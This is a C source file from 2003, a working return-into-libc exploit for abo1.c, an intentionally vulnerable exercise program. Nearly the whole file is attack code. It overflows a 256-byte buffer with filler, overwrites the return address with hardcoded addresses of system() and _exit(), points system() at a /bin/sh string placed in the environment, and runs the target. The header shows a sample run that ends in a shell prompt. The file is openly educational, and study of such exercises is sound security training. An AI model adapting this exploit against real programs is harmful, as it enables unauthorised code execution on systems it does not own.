/*
 * $Id: abo1-ex5.c,v 1.1 2003/11/08 16:20:14 raptor Exp $
 *
 * abo1-ex5.c - abo1.c exploit, for educational purposes
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * See http://community.core-sdi.com/~gera/InsecureProgramming/
 *
 * This exploit demonstrates the classic return-into-libc technique.
 *
 * $ uname -a
 * Linux karma 2.4.21 #1 SMP Mon Jun 16 00:58:22 CEST 2003 i686 unknown
 * $ gcc --version
 * 2.95.4
 * $ ./abo1-ex5
 * Using system() address  : 0x4005f590
 * Using _exit() address   : 0x400bae90
 * Using /bin/sh address   : 0xbfffffed
 *
 * sh-2.05a$ 
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define	VULN	"./abo1"	// this is the path to the vulnerable program
#define	BUF	273		// evil buffer size: (256 + 4) + (4 * 3) + 1
#define	SYSTEM	0x4005f590	// http://0xdeadbeef.info/code/libc-search.c
#define EXIT	0x400bae90	// http://0xdeadbeef.info/code/libc-search.c
#define SHELL	"/bin/sh"	// command that will be executed by system()

int main(int argc, char **argv)
{
	char	buf[BUF];
	char	*p = buf;

	/* put the /bin/sh string in env */
	char	*envp[2] = {SHELL, NULL};
	int	shell = 0xbffffffa - strlen(SHELL) - strlen(VULN);

	/* fill the vulnerable buffer */
	memset(p, 'A', (256 + 4));
	p += (256 + 4);

	/* prepare the stack */
	*((void **)p) = (void *)(SYSTEM);	/* system() address in libc */
	p += 4;
	*((void **)p) = (void *)(EXIT);		/* _exit() address in libc */ 	
	p += 4;
	*((void **)p) = (void *)(shell); 	/* /bin/sh address in env */
	p += 4;
	*p = 0x0;				/* terminate with NULL-byte */

	/* print some output */
	fprintf(stderr, "Using system() address\t: %p\n", SYSTEM);
	fprintf(stderr, "Using _exit() address\t: %p\n", EXIT);
	fprintf(stderr, "Using /bin/sh address\t: %p\n\n", shell);

	/* run the vulnerable program */
	execle(VULN, VULN + 2, buf, NULL, envp);
	perror("execle");
}
